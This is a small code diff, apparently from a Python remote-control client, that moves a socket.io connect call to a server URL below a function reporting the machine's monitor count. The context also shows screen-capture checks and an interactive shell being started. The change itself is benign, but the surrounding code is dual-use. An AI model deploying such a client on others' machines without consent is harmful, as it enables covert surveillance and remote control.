@@ -451,8 +451,6 @@ def run(data):
                 except:
                     "Thread is already dead"
 
-    sio.connect(data["url"])
-
     def emit_screen_count(data):
         while True:
             time.sleep(1)
@@ -461,6 +459,8 @@ def run(data):
                     print("No monitors found. Skipping screen capture.")
                 else:
                     sio.emit('screen_count', { 'uid': data['uid'], 'screen_count': len(sct.monitors)-1 })
+
+    sio.connect(data["url"])
 
     shell = InteractiveShell()
     shell.start()
